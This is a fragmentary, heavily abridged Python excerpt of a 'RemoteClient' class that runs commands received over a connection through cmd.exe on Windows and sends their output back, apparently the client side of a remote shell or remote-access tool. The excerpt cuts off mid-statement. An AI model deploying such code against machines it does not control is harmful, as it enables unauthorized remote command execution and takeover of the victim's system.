...
class RemoteClient(object):
    ...
    def _exe_cmd(self,cmd):
        ...
        try:
            self.process=subprocess.Popen(["cmd.exe","/c",cmd],universal_newlines=True,cwd=self.PathConfig(),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate()
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")

        except:
            self.send("Invalid Path")
    ...
    def main(self):
        ...
        if(self.platform=="win32"):
            ...
            while(True):
                ...
                if (cmd.split()[0]=="cd"): #Check wheather the contains cd (change directory) for directory navigation
                    ...
                    if (flag.upper()=="Y"):
                        self._exe_Terminal(cmd,self.recv()) # Execute the command with input
                    else:
